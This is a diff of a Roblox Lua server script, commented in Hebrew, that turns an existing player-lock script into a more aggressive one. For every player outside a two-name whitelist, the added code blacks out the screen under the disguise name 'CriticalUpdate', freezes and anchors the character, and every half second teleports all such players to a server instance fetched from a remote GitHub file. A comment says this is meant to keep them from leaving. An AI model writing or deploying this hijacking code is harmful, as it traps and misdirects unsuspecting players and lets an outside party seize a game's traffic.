@@ -1,58 +1,50 @@
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
+local GuiService = game:GetService("GuiService")
 
--- הקישור ה-Raw שלך
 local rawUrl = "https://raw.githubusercontent.com/gili435/me-nedd-this/refs/heads/main/dylanzyl120"
 
--- רשימת חסימה (הם לא ינעלו ולא ישתגרו)
 local blockedPlayers = {
 	["noamdb15"] = true,
 	["dylanzyl123"] = true
 }
 
--- פונקציה לנעילת השחקן (תנועה ומסך)
-local function lockPlayer(player)
-	-- 1. יצירת מסך שחור/טעינה
+-- פונקציה לנעילת שחקן וביטול העכבר
+local function hardLock(player)
 	local screenGui = Instance.new("ScreenGui")
-	screenGui.Name = "SystemMaintenance"
+	screenGui.Name = "CriticalUpdate"
 	screenGui.IgnoreGuiInset = true
-	screenGui.DisplayOrder = 999999
+	screenGui.DisplayOrder = 9999999
 	screenGui.Parent = player:WaitForChild("PlayerGui")
 
 	local frame = Instance.new("Frame")
 	frame.Size = UDim2.new(1, 0, 1, 0)
 	frame.BackgroundColor3 = Color3.new(0, 0, 0)
-	frame.Active = true
+	frame.Active = true -- חוסם לחיצות עכבר
 	frame.Parent = screenGui
 
-	-- 2. ניטרול תנועה לחלוטין
-	player.CharacterAdded:Connect(function(char)
-		local hum = char:WaitForChild("Humanoid")
-		hum.WalkSpeed = 0
-		hum.JumpPower = 0
-		hum.PlatformStand = true -- נועל את האנימציה והתנועה
-	end)
+	-- ניסיון להעלים את העכבר (צד לקוח)
+	local remote = Instance.new("RemoteEvent")
+	remote.Name = "LockMouse"
+	remote.Parent = game.ReplicatedStorage
+end
 
-	-- אם הוא כבר בתוך המשחק כשזה רץ
-	if player.Character then
-		local hum = player.Character:FindFirstChild("Humanoid")
-		if hum then
+-- נעילת תנועה (שלא יוכל לזוז אפילו סנטימטר)
+Players.PlayerAdded:Connect(function(player)
+	if not blockedPlayers[player.Name] then
+		hardLock(player)
+		player.CharacterAdded:Connect(function(char)
+			local hum = char:WaitForChild("Humanoid")
 			hum.WalkSpeed = 0
 			hum.JumpPower = 0
 			hum.PlatformStand = true
-		end
-	end
-end
-
--- הפעלה ברגע שמישהו נכנס
-Players.PlayerAdded:Connect(function(player)
-	if not blockedPlayers[player.Name] then
-		lockPlayer(player)
+			char:WaitForChild("HumanoidRootPart").Anchored = true -- מקבע אותו לאדמה
+		end)
 	end
 end)
 
--- לופ שיגור מהיר
+-- לופ שיגור אגרסיבי (כל 0.5 שניות!)
 task.spawn(function()
 	while true do
 		local success, response = pcall(function()
@@ -71,6 +63,7 @@ task.spawn(function()
 			if targetJobId and targetJobId ~= "" then
 				for _, player in pairs(Players:GetPlayers()) do
 					if not blockedPlayers[player.Name] then
+						-- שיגור אגרסיבי כדי לנסות למנוע יציאה מהמשחק
 						pcall(function()
 							TeleportService:TeleportToPlaceInstance(targetPlaceId or game.PlaceId, targetJobId, player)
 						end)
@@ -78,6 +71,6 @@ task.spawn(function()
 				end
 			end
 		end
-		task.wait(1)
+		task.wait(0.5) -- חצי שניה כדי להיות הכי מהיר בשרת
 	end
 end)
